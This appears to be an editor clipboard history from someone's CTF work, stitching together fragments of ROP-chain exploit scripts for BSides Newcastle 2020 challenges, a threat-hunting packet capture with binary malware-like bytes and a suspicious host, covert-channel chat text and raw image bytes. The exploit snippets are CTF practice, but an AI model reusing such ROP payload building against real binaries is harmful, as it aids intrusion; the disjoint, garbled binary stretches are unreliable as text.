9757c951b866278b2b7a8ee65175564c|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|52|1|V|python
	pop3 = 0x08049773
	pop2 = 0x08049774
	pop1 = 0x08049775
	push_eax = 0x080584b8
	pop_eax_edx_ebx = 0x0805e8b4
	xor_eax_0x81fffd18 = 0x08078367
	ret = 0x0808dc99
3f0e920eda58ce3e2421c929abdda82b|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|69|1|V|python
	payload += p32(pop3)
	payload += p32(0xbadf4c3d)
	payload += p32(0xa73f00d)
	payload += p32(0xf4ceb00b)
a23e4a7cdb832498f8694245980edb33|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|49|1|V|python
	pop2 = 0x08049774
8fc5308561e2cc486c8a9ebd81df0dbb|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|66|1|V|python
	payload += p32(0x81fffd18 ^ 0xa73f00d)
285181346995b0db9ee5dc315f5167aa|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|65|1|V|python
	payload += p32(pop_eax_edx_ebx)
988d3a25dc84190342a0d452ff3e6448|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|65|1|V|python
	payload += p32(xor_eax_0x81fffd18)
763922b4b66fefe97e327e9b22af836d|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|65|1|V|python
	payload += p32(push_eax)
a854587ebbc23a7b7b4cd7b388aa5fbb|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|64|1|V|python
	payload += p32(ret)
edd3604ab393857e6ab0ec116adf47ac|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|66|1|V|python
	payload += p32(0xb4df4c3d)
b1388447fe7f8ec9a692904c60048a62|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|67|16|v|python
	0xb4df4c3d
020fb6fe1cf1153f05c704e84a2d7e44|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|72|1|v|python
	0x080a678d
2ec044981846093952a0c1cd971ff97b|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|81|1|V|python
	0x08087b96: push ebp; push ebx; push esi; call edi;
1641dab3569e0fc825f8a0b762a9a1f9|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|74|1|V|python
	0x080a678d: pop ebx; pop esi; sub eax, edx; pop edi; pop ebp; ret;
025c8ba88fcbb4ad74cf73ad16083b05|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|74|1|V|python
	0x080ae1d6: pop eax; ret;
461dc1fe05910a35946b46543712eeab|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|56|15|v|python
	p32(
c4419e48d8ee52945f0331fb136d0d91|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|82|1|v|python
	0x0804b22b
54a2ed4b0f2d9734d673b95b0fa3a72b|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|56|1|V|python
	0x0805e785: pop edx; pop ebx; ret;
	0x08065a5e: pop edx; pop ebx; pop esi; ret;
95a5f01d910320cbdcac98f778e8addb|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|56|1|V|python
	pop_pop_sub = 0x080a678d
4eb4c58f2c9dcc2c5d543327b2f64818|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|83|1|v|python
	0x0805c24a
40f6d3aa1523afa49b0ba1b96f88ab32|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|90|3|v|python
	0x0805e785
1b59db90cf9b0ba4bfbc94392452c808|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|69|16|v|python
	sub_edx_2pop
cc227680c749341fdf4af875ba3b8fd4|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|71|1|V|python
	payl
c0b38c63e956ebc4c54b0c3a5d30c01d|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|70|16|v|python
	0xa73f00d + 0x10101010
6add84506c86a658bc85038f91e35ce7|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|70|30|v|python
	10101010
724817de2c2f9cc95f2437b4747e08d4|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|71|26|v|python
	0101010
c7feaeca3957aba4749b15c0076f293b|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|71|1|V|python
	print(hex(0xa73f00d + 0x11111111))
eda5d973377621c5a812e254ca36a435|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|86|1|V|python
	# 0x0805ad45: push edx; push eax; push esi; call dword ptr [edi + 0x40];
	# 0x0805af33: push edx; push eax; push edi; call dword ptr [ebx + 0x38];
	# 0x0805bb60: push edx; push eax; push esi; call dword ptr [ebx + 0x40];
3cbcd17b681af50b4f4b51fc7cdf11fe|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|85|3|v|python
	0x0805e784
e3653c0a7373094c1771f6ed510cb63e|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|69|16|v|python
	pop_edx_pop
f40024ddd51831bfad7b1a658f528a99|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|94|3|v|python
	0x08063b71
8621aae8d1772634869639159b2f37f2|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|89|3|v|python
	0x08065113
f8e2dcb27351d50aa9c63a6698f6352d|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|90|1|V|python
	# 0x08065113: push ecx; push edx; push ebx; call eax;
b158a93a62aaac6fc521e862c6c64ec7|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|79|12|v|python
	p32(patch_auth3) # pop eax - func address
71cc41122b066e07ce3d0ca8a9579abe|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|79|1|V|python
	payload += b'junk' # pop eax
	payload += p32(0xa73f00d + 0x11111111) # pop edx - second arg
	payload += b'junk' # pop ebx 
	payload += p32(sub_edx_2pop)
	payload += b'junk'
	payload += b'junk'
	
14fd8021bb53a31556be62bc3f25b9a4|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|78|1|V|python
	payload += p32(pop_eax_edx_ebx)
	payload += b'junk' # pop eax
	payload += p32(0xa73f00d + 0x11111111) # pop edx - second arg
	payload += b'junk' # pop ebx 
	payload += p32(sub_edx_2pop)
	payload += b'junk'
	payload += b'junk'
3c27585b44e584211842e346e0255f4c|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|86|1|V|python
	payload += p32(patch_auth3)
	payload += b'junk'
	payload += p32(0xbadf4c3d)
	payload += p32(0xa73f00d)
	payload += p32(0xf4c3b00b)
5cd9087393ac763888cc7fef6a5c6766|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|61|3|v|python
	0x080606f6
0d30f21634deefd2af049a0886bd54d5|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|87|27|v|python
	 # pop esi -third arg
9c5d7cddd6b8427e30ac6285206ffc23|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|87|16|v|python
	0xf4ceb00b
dd5c8bf51558ffcbe5007071908e9524|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|91|40|v|python
	third
b40a3bc222e32016240bd468a1535bfb|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|85|16|v|python
	0xbadf4c3d
7b0ecb81ebe63ecfa3a68c8188535143|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|90|1|V|python
	payload += p32(patch_auth3 - 0x89) # pop eax - func address
021939590e546aed21b59fafdf8d741c|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|90|1|V|python
	# payload += p32(patch_auth3 - 0x89) # pop eax - func address
abbc9d1baa06bd7b2fd1300295d096e5|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|91|1|V|python
	payload += p32(ret - 0x89 + 0x100) # pop eax - func address
3b81687b081f95a63f100581041ca8ca|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|95|1|V|python
	payload += 
5a694294024a34865095570a91ff9265|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|95|1|V|python
	payload += b'junk'
	payload += b'junk'
	payload += b'junk'
14d557a3213118cd449f281dfcb1e342|file:///home/neo/CTFs/bsidesncl2020/threathunting/file.raw|1|1|V|
	GET /EV990701zD HTTP/1.1
	Host: canlibets10.com
	Connection: Keep-Alive
	
	HTTP/1.1 301 Moved Permanently
	Date: Thu, 30 Aug 2018 12:52:30 GMT
	Server: Apache
	Location: http://canlibets10.com/EV990701zD/
	Content-Length: 242
	Keep-Alive: timeout=5, max=100
	Connection: Keep-Alive
	Content-Type: text/html; charset=iso-8859-1
	
	<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
	<html><head>
	<title>301 Moved Permanently</title>
	</head><body>
	<h1>Moved Permanently</h1>
	<p>The document has moved <a href="http://canlibets10.com/EV990701zD/">here</a>.</p>
	</body></html>
	GET /EV990701zD/ HTTP/1.1
	Host: canlibets10.com
	
fdea9897fe79bd9da67e6bad4103ca8d|file:///home/neo/CTFs/bsidesncl2020/threathunting/file.raw|1|1|V|
	GET /EV990701zD HTTP/1.1
	Host: canlibets10.com
	Connection: Keep-Alive
	
	HTTP/1.1 301 Moved Permanently
	Date: Thu, 30 Aug 2018 12:52:30 GMT
	Server: Apache
	Location: http://canlibets10.com/EV990701zD/
	Content-Length: 242
	Keep-Alive: timeout=5, max=100
	Connection: Keep-Alive
	Content-Type: text/html; charset=iso-8859-1
	
	<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
	<html><head>
	<title>301 Moved Permanently</title>
	</head><body>
	<h1>Moved Permanently</h1>
	<p>The document has moved <a href="http://canlibets10.com/EV990701zD/">here</a>.</p>
	</body></html>
	GET /EV990701zD/ HTTP/1.1
	Host: canlibets10.com
	
	[15988 bytes missing in capture file]
JR
3HRHJH
RHJRrr
#
E
H
3
h
#


3
#
E
3
w
h
E
W
#
H
#
w
H
#
w
#
#


E
3
H
h
E
E
3
W
#
#
h
W
w


H
W
H
#
W
3
#
H
w
H
E
#
h
#


H
#
3
#
#
#
#
W
#
#
W
W
#
H
#
w
H
w


3
h
3
h
3
h
3
W
h
#
H
h
w
H
h
h
w


w
#
#
w
h
3
h
W
#


rRWRJ1
1E1JRE
#RJJRH
JW13H1
HE#WwK
WK1RRW
#3EH1r
J#rRKw
EWER#3
EHw1W3
RrwJ#J
WJH31H
H
H
w
h
#
#
H
#


3
#
W
W
H
W
E
E
#
H
W
#
#
3
#
	1f40
15257311f4f05ce32a04013c3df2a411|file:///home/neo/CTFs/bsidesncl2020/threathunting/file.raw|27|1|V|
	
#
H
W
h


1J1Kw3
3R3WHW
KW3J3J
R1WErH
W#RR1R
rKJWWr
1JRrRW
JJ111w
w1HJRK
RRH1R1
RwwRWR
JJRRWH
h
#
#
W
3
E


3
#
W
H
#
#
#
#
w
3
E
E
#
W
#
#
E
E


W
H
#
3
#
#
#
3
#
h
#
h
h
W
w


3
#
#
#
#
h
H
E
3
h
w
#
H


H
3
#
h
h
w
h
#
h


H
#
w
#
W
h
#
#
E
w
#
W
E


RJ1W33
#W3ERE
EwW1WR
WrwJJW
JWRRw#
wWWJR#
E31JHR
1wR3rW
1wR#EK
##RwEJ
wwJR3#
r13ERW
w
#
h
h
H
3
H
H
E


#
h
H
E
#
3
#
W
3
H
#
#
W
3
W
H
3
E


h
h
#
#
#
#
H
W
E
w
#
3
#
E


E
#
#
W
w
w
#
#
3
h
#


w
#
w
h
#
#
3
h
w
#
3


#
#
H
E
H
#
E
E
w
h
h
E


#
#
#
w
#
H
H
#
E
#
E
h
E


rKrW1w
1rKWKH
KrWRKw
WWW#K#
JE13Rw
W1HJH1
3RREWJ
wH1WWW
3JRKRr
RJJJ#W
JRHWWr
3RRWER
w
H
h
w
H
E
3
E
W
h
w
3
h
h
h


#
#
W
3
E
3
#
H
3
#
#
W
#
3
E
E
3


E
h
#
#


3
#
H
#
3
#
#
E
W
w
#


rwRrKH
1WRWJr
#WJWJW
ErHJJr
31JrJJ
wR1EwK
RWJJWW
#rRHWH
rHRKWH
rJHJRH
JWE3RH
WWWRrE
h
#
E
w
w
#
w


#
H
#
#
E
#
3
3
E
E


E
E
#
W
H
E
W
w
E
W
w


w
W
#
w
3
W


#
3
E
#
#
#
E
w
#
E
#
W
#
#
w
#
h


W3RW33
#JWRrJ
#J1JR1
rWEHRK
rHW#3K
w#r#W#
E#1#Rw
RRrw#H
JWREJw
E1J1WW
J#R1WR
HwJ#rK
E
3
#
H
E
3
w
W
H
#
3
#
W


#
H
h
h
E


#
#
W
h
H
w
h
w
h
#
3


E
h
h
w
h
H
H
#
H
E
h
W
w
3
#
w


w
#
E
E
h
#
H
h
h
H
#
#


w
h
3
#
3
#
#
#
W
h
W
#
#


Hr3EJR
J#3w3K
RJRJJR
WRJWHW
1WJH33
K1rr3W
wH1RHR
H#3WWJ
WHWRWJ
rKWWRW
#rEWJR
J#JWER
#
E
H
3
h
#
E
3
w


#
#
h
W
3
E
E
#
3
w
E
#
H
W


#
3
3
#
#


h
#
w
w
H
#
H


E
#
3
h
#
H
w
E
3
E
#
#


#
3
#
h
H
#
3
#
#
#
3


3
#
3
w
#
#
w
#
w
#
h
E
3
h


3H1J1W
3Jrw1E
1w1H#E
1WJRKR
ER1#W1
#W1wKR
W#1WHR
3JEr11
ErwEr#
1JKW11
HEHEJJ
J1WHEW
h
E
#
#
#
#
#
w
3
#


W
W
#
E
#


#
E
#
w
#
#
w
h
W
H
E
E
E
3
3
#


#
w
#
W
3
#
h
#
3
h


H
3
#


#
#
#
w
#
E
#
#


3WRw#H
w3HHW3
rrwWWJ
wW#JK3
HRRKKR
rrRRJ3
WRER#1
EJKHRr
ErWWWH
E#JR#K
3R3#3r
#WKR#H
w
E
E
w
w
#
E
W
3
w
3


W
w
W
H
#
#
h
3
W
W
#
H
h
H
w


w
W
#
W
#
3
#
E
h
#
w
w
#


H
#
#
#
w
#
h
3
#
H
w
E
3
3
E
W
#
3


W
3
h
#
#
3
H
#
#
3
#
W
h


E
#
w
#
h
H
#
w
E
E
h
w
w
W
E
W
#


#
E
3
H
w
h
#
E
#
W
#
w
#
#
h
h


RRKKr#
31Ww3H
WR1W1W
w#wWWJ
wW1wKK
RHwRWE
#WR#KR
3JRrEW
WrWRHK
K33K#H
w3111J
#RHKKJ
#
E
h
3
H
#
w


w
3
#
#
w
w
E
w
w
#
#
3
w


W
E
W
#
#
#
#
H
w
#
h
E
h
w


3
#
H
3
H
3
#
H


E
3
E
E


3
#
E
#
H
H
E
w


JRJwKR
KJWwRR
1J1K3R
Er1ER#
EWJ1K3
J3#HWK
3JJ3JJ
ERJWJR
W1RHE#
w#WHHR
K#WWJ1
KWWW1W
#
E
h
H
#
h
H
3


h
E
#
w
w


w
w
#
E
#
w
H
H
E
H
#
H
W
w
#


H
W
W
W
#
w


E
H
3
W
W
#
H
#
h
#
h
W
W


#
h
H
W
W


#
#
H
E
E
h
E
W
E
H


w
W
h
w
H
W
3
#
w
#


RwJEEJ
R#JRWH
1#ERKR
#rJ#RJ
#w1HrW
1JE1rJ
wW3JRJ
W3ER3J
RrWwWJ
3WJJWW
WwKHwR
wwEK3W
#
E
w
h
H
w
#
#
#
3
#
W
#
h


#
W
W
w
3
#
#


h
W
H


w
#
W
W
H
#
h


#
h
#
#
W
#
#
#
H
#
W
3
3
W
E
#
#
#


#
H
w
w
#
#
W
#


#
W
W
#
3
#
E
3


H
#
#
h


rwwHrJ
RWwWK#
K3wR#W
HwrWWW
3WRWWW
HR3RWK
JrWWrJ
EKRrWJ
WRREJH
RWrHwR
3ErE33
WwERWJ
#
#
W
#
#
#
H
#
W


#
H
W
h
w
w
H
#
w
#


3
W
3
#
#
w
h
#
#
W
3
w
w


w
w
w
3
w
E
H
E
3
h


h
#
H
3
#
3
H
h
h
#
H
3
h


h
W
3
H
#


#
H
h
H
h


H
#
#
W
3
#
H


HW#rrJ
J1333w
wwrRRw
RH#RKW
JK3rWR
EE3EE1
KJJRr3
rr1RRw
W3W3#K
RHWJKr
Ew##WJ
RRJ31W
W
3
W
w
h


E
E
#
3
#
H
3
W


E
#
W
#
#
w
#
#
H
w
#
w
w
W
w


#
#
#
W
W
W


H
w
3
h
E
#
E
H
H
W
E
h
W
#
W
W


#
w
3
#
W
#
#


h
H
3
w
w
#
#
3
#
#
#
E
#
w
H


3EJ#ER
R#wJJW
HK#Er3
rW#E3H
KWEWwr
R3RJRJ
1rErrK
#RHKRW
EWwJ#r
RJrrWK
3JHJWr
RRrJWJ
h
W
H
E
#


#
E
#
h
#
W
#
#
E
#
E
#
#
3
#


H
3
#
#
#
#
W
E


w
#
W
W
W
E
W
h
3
W
E
h


E
W
#
w
E
#
3
W


W
E
E
h


¬ê√Ω¬ê√¨.SJ√æ¬µ√∂
¬ç√Æ¬û√Æ'¬ë√ÑwZ+s¬¨
n√≠¬û√á'¬ô6¬∏Y$k!\¬ìi¬Ü√≠¬û√•5¬ò√¶
x√≤¬û√¥7¬ÜR√ì¬µb.j¬¨
√µ¬¶¬§√øc√â√†¬ã¬¨¬°¬Ç¬Ö√∫-U¬Å√ó√Çg¬µ¬ó√Ω*TOxP¬é√∫`?√í√ô√ö!
432172b97faab2a9c1d8b2a56522a28a|file:///home/neo/CTFs/bsidesncl2020/threathunting/file.raw|1|1|V|
	










	




































!


"















a9a2c780a541c41dbea5757afa8c7e9d|file:///home/neo/CTFs/bsidesncl2020/threathunting/file.raw|1|1|V|
	














$








#


 




















"¬â,¬Ä√Ç%√¶¬íI√∂¬ø¬¨√™.(

w
h
W
J
W
j
e
r
w


w
e
j




RSDS√•\√∫√à√¨¬´!K¬û¬¶√±4√®I¬∞k


hHerWJE2324Jkry.pdb



































































































U¬â√•WV¬É√§√∏¬É√¨ ¬ãE¬ãM¬∫¬â49√áD$-¬Å$√áD$¬ì√≠SO¬ãt$¬É√∂√ø¬ât$¬ãt$¬Å√∂TR%¬â√è¬Ø√ø¬Ø√πt$9√≤¬âD$¬â<$v
¬ãD$¬Ø√Ä¬ãL$¬Ø√Å¬ã$√ê¬çe√∏^_]√ÉU¬â√•¬É√§√∏¬É√¨¬ãE√ÜD$y¬äL$¬ä¬Ä√±¬§
√ä¬Ä√∫3¬ó√Å¬Ä√°¬∂√Å¬â√¨]√ÉU¬â√•SVP¬ãE¬ãM¬ãU¬ã
¬â√Ü¬Ø2¬É√Ü¬ä¬É√∞√ø¬∂√ì1√≤¬à√ì¬âE√¥¬à¬É√Ñ^[]√ÉU¬â√•¬ãE¬ã
√Å√†]√ÉU¬â√•S¬É√§√∏¬É√¨ ¬ãE¬ãM¬ãU√áD$



√áD$N
02156cc21674081fa70ad3b7aac2745b|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|55|1|V|python
	pop_edi = 0x0804b22b
	sub_edx_2pop = 0x0805c24a
	pop_eax_edx_ebx = 0x0805e784
	pop_ecx =  0x08063b71
	pop_esi = 0x0804ae2a
	
	# 0x080606f6: pop eax; add al, 0x89; ret;
	pop_eax = 0x080606f6
	# 0x08065113: push ecx; push edx; push ebx; call eax;
	push_ecx_edx_ebx_call_eax = 0x08065113
	pop_ebx = 0x0804901e
	ret = 0x080b1373
c72bb50e7b0f87b262af14f5a31fdae6|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|72|1|V|python
	ret = 0x080b1373
5aa8b2f5dd4153cc3d5b9adc1b6ad74e|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|67|1|V|python
	# 0x080606f6: pop eax; add al, 0x89; ret;
0e83ecd9e3b45939341da754e2c49a8d|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|61|10|v|python
	 0x0804b22b
55162eef93fff676f7d66c8e37e02a9d|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|63|18|v|python
	 0x0805e784
3926cc50d733073c88491f377f39961e|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|64|11|v|python
	 0x08063b71
7d75f4fb5572f86310ac41d92fa61201|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|65|10|v|python
	 0x0804ae2a
545e1fdeffe0b9cd908e545ce46783d8|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|66|10|v|python
	 0x080606f6
dd3ce0dcfc721af94020d6011dc229b6|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|68|11|v|python
	0x0804901e
19b9855cfd28709a0516efc89319cfbf|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|100|1|V|python
	# 0x0805c24a: sub edx, edi; pop edi; pop ebp; mov eax, edx; ret;
a5edf0943abd2a1a5f9e6ae2ae2e3c4d|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|106|1|V|python
	# 0x08063b71: pop ecx; add al, 0xf6; ret;
b4c52f1eb9c2aaf74aeab9f2f13b2741|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|103|1|V|python
	# 0x0805e784: pop eax; pop edx; pop ebx; ret;
4c90df79f7feacf10b4a4db0d2fdcfee|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|80|1|V|python
	payload += p32(pop_eax_edx_ebx)
	payload += p32(0x81fffd18 ^ 0xa73f00d)
	payload += b"junkjunk"
	payload += p32(xor_eax_0x81fffd18)
	payload += p32(push_eax)
	payload += p32(patch_auth3)
	payload += p32(pop3)
	payload += p32(0xbadf4c3d)
	payload += p32(0xa73f00d)
	payload += p32(0xf4ceb00b)
cd1a899f2dafbfb01b80702e6b4b5b4b|file:///home/neo/CTFs/bsidesncl2020/patched2/exploit.py|84|1|V|python
	payload += p32(pop_edi)
	payload += p32(0x11111111) # pop edi
	payload += p32(pop_eax_edx_ebx)
	payload += b'junk' # pop eax
	payload += p32(0xa73f00d + 0x11111111) # pop edx - second arg
	payload += b'junk' # pop ebx 
	payload += p32(sub_edx_2pop)
	payload += b'junk'
	payload += b'junk'
	payload += p32(pop_ecx)
	payload += p32(0xf4ceb00b) # pop ecx - third arg
	payload += p32(pop_esi) 
	payload += p32(0xf4ceb00b) # junk
	payload += p32(pop_eax)
	payload += p32(patch_auth3 - 0x89) # pop eax - func address
	payload += p32(pop_ebx)
	payload += p32(0xbadf4c3d) # pop ebx - first arg
	payload += p32(push_ecx_edx_ebx_call_eax)
	payload += b'junk' * 12
ef8b6140c05aa6d2fe47df3f1cfdee02|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|58|1|V|python
	xor_eax_0x81fffd18 = 0x08078367
99e14ecdba17c7da4a751916e2520068|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|58|1|V|python
	ret = 0x0808dc99
27ae41c8768cf5008d2391b38a2e6214|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|56|1|V|python
	push_eax = 0x080584b8
	pop_eax_edx_ebx = 0x0805e8b4
d747f4cb1bbadf61bd28f119a276fd52|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|66|11|v|python
	Emerg
e4c42f0fb68e219fb8b2f221a72af536|file:///home/neo/CTFs/bsidesncl2020/authenticator/exploit.py|66|20|v|python
	emergency_shell
16c2f24037b8d3c5f881ea50bdd03302|file:///home/neo/CTFs/bsidesncl2020/threathunting/photo.png|1|1|V|
	GET /favicon.ico HTTP/1.1
	Accept: */*
	Accept-Encoding: gzip, deflate
	User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
	Host: www.bing.com
	Connection: Keep-Alive
	
	HTTP/1.1 200 OK
	Cache-Control: public, max-age=15552000
	Content-Length: 237
	Content-Type: image/x-icon
	Last-Modified: Thu, 31 Jan 2019 18:52:18 GMT
	Vary: Accept-Encoding
	Server: Microsoft-IIS/10.0
	X-MSEdge-Ref: Ref A: B493491A3E6D4765973F874A3E0FDD32 Ref B: ASHEDGE0206 Ref C: 2019-02-13T05:59:47Z
	Date: Wed, 13 Feb 2019 05:59:47 GMT
	
c743a45e0d2e6a95cb859adae0248435|file:///home/neo/CTFs/bsidesncl2020/patched/password.txt|1|1|V|text
	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
6fe80c0c3ff56d2f111625940bf46b5d|file:///home/neo/CTFs/bsidesncl2020/patched/exploit.py|72|1|V|python
	# Zero out ecx
	payload += p32(xor_eax)
	payload += p32(push_eax)
	payload += p32(pop_ecx)
805174dab65d44fa5364c5ef727c1b7c|file:///home/neo/CTFs/bsidesncl2020/patched/exploit.py|77|1|V|python
	payload += p32(xor_eax)
	payload += p32(push_eax)
1081ac2533a6a55110adb6f5bf138569|file:///home/neo/CTFs/bsidesncl2020/patched/exploit.py|75|1|V|python
	payload += p32(xor_eax)
1e9a4a268bb23b4e0447ae3e9eb3dc43|file:///home/neo/CTFs/ccsc2020/much_more_than_echoes/writeup.md|115|15|v|vimwiki
	 packet[Raw].load
d12daec73032ea4b1346ee01e4fd4b5f|file:///home/neo/CTFs/bsidesncl2020/patched/exploit.py|55|1|V|python
	# push_eax = 0x080c77b6
d160bbae33b9813364052b38e66e9389|file:///home/neo/CTFs/bsidesncl2020/patched/exploit.py|54|1|V|python
	# 0x080c77b6: push eax; ret;
c9e069147546683edbf1135db0313775|file:///home/neo/CTFs/bsidesncl2020/patched/exploit.py|54|3|v|python
	0x08092b97
f2ecc672772a011c606ed756be9adca3|file:///home/neo/CTFs/bsidesncl2020/patched/exploit.py|55|22|v|python
	0x080c77b6
83459229e95245ec0190d9fb3c268c38|file:///home/neo/CTFs/bsidesncl2020/patched/exploit.py|68|1|V|python
	payload += b'aaaa'
cfb27f73438305f8117e13e550a392c6|file:///home/neo/CTFs/bsidesncl2020/patched/exploit.py|55|1|V|python
	push_eax = 0x08092b97
f8e4a0bd274de9cf8caa421a635f42c3|file:///home/neo/CTFs/bsidesncl2020/patched/exploit.py|54|1|V|python
	# 0x08092b97: push eax; add al, 0x39; ret;
3d4e480c3b617b19255975e88f346370|file:///home/neo/CTFs/bsidesncl2020/patched/exploit.py|54|3|v|python
	0x08064614
cb61a318341ace81593aaaf3d8b53a27|file:///home/neo/CTFs/bsidesncl2020/patched/exploit.py|88|1|V|python
	print(exe.sym.login)
d399f3225f30e838319ff04d4fb4052c|file:///home/neo/CTFs/bsidesncl2020/areyoualive/sol.py|7|5|V|python
	    print(inst)
37f144123bcdcb3a5d1e6a25116d0b7e|file:///home/neo/CTFs/bsidesncl2020/areyoualive/file|1|1|V|
	9.9.99.99-> b'(o-o) hi bro lits do it like beforrrrrrrrrrrrrrr'
	
	9.9.33.33-> b'ooooooh ya i love geting secrit in this way '
	
	9.9.99.99-> b'you who will look to the echos in the network layer ;)'
	
	9.9.33.33-> b'ok bro , but dont be gradyyy '
	
	9.9.99.99-> b'bro bro bro bro dont worry , i will send you my part frist , then you send your '
	
	9.9.33.33-> b"then , ok that's the deal , but do you think any one can find this "
	
	9.9.99.99-> b'no , we can do this for 500 years and no one can find out '
	
	9.9.33.33-> b'ok , i got it , lets start'
694364ad0c288a78d5bc7389ac03842c|file:///home/neo/CTFs/bsidesncl2020/areyoualive/file|1|1|^v|
	9.9.99.99-> b'\
0fd7dd1d4f6bb8585671361cc4decff5|file:///home/neo/CTFs/bsidesncl2020/areyoualive/file|2|1|^v|
	9.9.99.99-> b"
4ce387808dcafe9934c03f00d3e68f58|file:///home/neo/CTFs/bsidesncl2020/areyoualive/file|2|1|v|
	9.9.99.99-> b
49d8869b0dfff7df9e389217b6e38278|file:///home/neo/CTFs/bsidesncl2020/areyoualive/file|1|4248|V|
	\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00\xff\xdb\x00C\x00\n\x07\x07\x08\x07\x06\n\x08\x08\x08\x0b\n\n\x0b\x0e\x18\x10\x0e\r\r\x0e\x1d\x15\x16\x11\x18#\x1f%$"\x1f"!&+7/&)4)!"0A149;>>>%.DIC<H7=>;\xff\xdb\x00C\x01\n\x0b\x0b\x0e\r\x0e\x1c\x10\x10\x1c;("(;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;\xff\xc0\x00\x11\x08\x03\xca\x07\x80\x03\x01"\x00\x02\x11\x01\x03\x11\x01\xff\xc4\x00\x1f\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\xff\xc4\x00\xb5\x10\x00\x02\x01\x03\x03\x02\x04\x03\x05\x05\x04\x04\x00\x00\x01}\x01\x02\x03\x00\x04\x11\x05\x12!1A\x06\x13Qa\x07"q\x142\x81\x91\xa1\x08#B\xb1\xc1\x15R\xd1\xf0$3br\x82\t\n\x16\x17\x18\x19\x1a%&\'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz\x83\x84\x85\x86\x87\x88\x89\x8a\x92\x93\x94\x95\x96\x97\x98\x99\x9a\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xff\xc4\x00\x1f\x01\x00\x03\x01\x01\x01\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\